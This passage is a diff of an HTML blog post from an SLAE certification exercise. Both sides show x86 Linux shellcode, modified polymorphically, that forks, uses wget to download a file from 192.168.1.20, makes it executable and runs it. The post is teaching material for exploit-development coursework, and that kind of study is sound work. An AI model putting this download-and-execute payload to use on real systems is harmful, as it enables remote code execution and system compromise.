-</span><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>            <span class=c>; [M] push edx instead of eax
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span> <span class=no>esp</span>        <span class=c>; set current stack pointer to edx
-</span><span class=c></span>    <span class=no>push</span> <span class=no>ebx</span>
-    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>
-    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xa</span>         <span class=c>; [M]
-</span><span class=c></span>    <span class=no>inc</span> <span class=no>al</span>              <span class=c>; [M] 0xb is execve syscall
-</span><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
-</span><span class=c></span>
-<span class=nl>child:</span>
-    <span class=c>;download 192.168.1.20/x with wget
-</span><span class=c></span>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>        <span class=c>; [M]
-</span><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>             <span class=c>; [M]
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xb</span>         <span class=c>; [M] execve syscall
-</span><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>
-
-    <span class=nf>push</span> <span class=no>word</span> <span class=mi>0x782f</span>    <span class=c>; [M] /x avoid null byte
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x30322e31</span>     <span class=c>; [M] 20.1
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x2e383631</span>     <span class=c>; .861
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x2e323931</span>     <span class=c>; .291
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>
-    <span class=nf>push</span> <span class=no>edx</span>
-
-    <span class=nf>push</span> <span class=mi>0x74</span>           <span class=c>;t
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x6567772f</span>     <span class=c>;egw/
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x6e69622f</span>     <span class=c>;nib/
-</span><span class=c></span>    <span class=no>push</span> <span class=mi>0x7273752f</span>     <span class=c>;rsu/
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>
-    <span class=nf>push</span> <span class=no>edx</span>
-    <span class=nf>push</span> <span class=no>ecx</span>
-    <span class=nf>push</span> <span class=no>ebx</span>
-    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>
-    <span class=nf>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
-</span></code></pre></td></tr></table>
-</div>
-</div><p>We added 5 bytes and removed 2 lines from the original shellcode. This results in a total of 113 bytes for the modified shellcode. That&rsquo;s a 4% increase :) The image below shows how the program downloads a file and executes it.</p>
-<p><img src=shellcode_3_image.png alt=shellcode_3_image.png></p>
-<p>That&rsquo;s it, stay tuned for the next and final article in my SLAE series.</p>
-<hr>
-<p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p>
-<p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p>
-<p>Student ID: SLAE-1490</p>
-</article>
-</div><footer>
-</footer></main>
-<script src=/js/particles.min.js defer></script>
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>global</span> <span class=no>_start</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nf>section</span> <span class=no>.text</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c>;fork
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>         <span class=c>; [M] zero ecx instead of eax
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>             <span class=c>; [M] set eax and edx to zero
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0x1</span>         <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>inc</span> <span class=no>al</span>              <span class=c>; [M] fork syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>edx</span>         <span class=c>; [M] mov edx into ebx instead of xor ebx,ebx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>cmp</span> <span class=no>eax</span><span class=p>,</span><span class=no>ebx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>jz</span> <span class=no>child</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c>;wait(NULL)
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span><span class=no>eax</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span><span class=mi>0x8</span>          <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>dec</span> <span class=no>al</span>              <span class=c>; [M] waitpid syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>
+</span></span><span class=line><span class=cl>    <span class=c>;chmod x
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>;xor ecx,ecx        ; this can be removed
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>eax</span><span class=p>,</span> <span class=no>eax</span>        <span class=c>; zero out eax
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>            <span class=c>; [M] push edx instead of eax, null byte
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xf</span>         <span class=c>; chmod syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x78</span>           <span class=c>; &#34;x&#34; character
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>        <span class=c>; set current stack pointer to ebx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>edx</span>        <span class=c>; [M] mov ecx,edx instead of xor ecx,ecx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>cx</span><span class=p>,</span> <span class=mi>0x1ff</span>       <span class=c>; set chmod mode to 511
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>
+</span></span><span class=line><span class=cl>    <span class=c>;exec x
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=c>;xor eax, eax       ; this can be removed
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>push</span> <span class=no>edx</span>            <span class=c>; [M] push edx instead of eax
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x78</span>           <span class=c>; &#34;x&#34; character
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span> <span class=no>esp</span>        <span class=c>; set current stack pointer to ebx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>            <span class=c>; [M] push edx instead of eax
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>edx</span><span class=p>,</span> <span class=no>esp</span>        <span class=c>; set current stack pointer to edx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>ebx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>esp</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xa</span>         <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>inc</span> <span class=no>al</span>              <span class=c>; [M] 0xb is execve syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>
+</span></span><span class=line><span class=cl><span class=nl>child:</span>
+</span></span><span class=line><span class=cl>    <span class=c>;download 192.168.1.20/x with wget
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=nf>xor</span> <span class=no>ecx</span><span class=p>,</span> <span class=no>ecx</span>        <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mul</span> <span class=no>ecx</span>             <span class=c>; [M]
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>al</span><span class=p>,</span> <span class=mi>0xb</span>         <span class=c>; [M] execve syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>edx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>word</span> <span class=mi>0x782f</span>    <span class=c>; [M] /x avoid null byte
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x30322e31</span>     <span class=c>; [M] 20.1
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x2e383631</span>     <span class=c>; .861
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x2e323931</span>     <span class=c>; .291
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>edx</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=mi>0x74</span>           <span class=c>;t
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x6567772f</span>     <span class=c>;egw/
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x6e69622f</span>     <span class=c>;nib/
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=mi>0x7273752f</span>     <span class=c>;rsu/
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>edx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>ecx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span> <span class=no>ebx</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span> <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>
+</span></span><span class=line><span class=cl>    <span class=nf>int</span> <span class=mi>0x80</span>            <span class=c>; execute syscall
+</span></span></span></code></pre></td></tr></table></div></div><p>We added 5 bytes and removed 2 lines from the original shellcode. This results in a total of 113 bytes for the modified shellcode. That&rsquo;s a 4% increase :) The image below shows how the program downloads a file and executes it.</p><p><img src=shellcode_3_image.png alt=shellcode_3_image.png></p><p>That&rsquo;s it, stay tuned for the next and final article in my SLAE series.</p><hr><p>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</p><p><a href="https://www.pentesteracademy.com/course?id=3">https://www.pentesteracademy.com/course?id=3</a></p><p>Student ID: SLAE-1490</p></article></div><footer></footer></main><script src=/js/particles.min.js defer></script>
 <script src=/js/particles.conf.js defer></script>
 <script src=/js/baffle.min.js async></script>
-<script src=/js/main.js defer async></script>
-</body>
-</html>
+<script src=/js/main.js defer async></script></body></html>
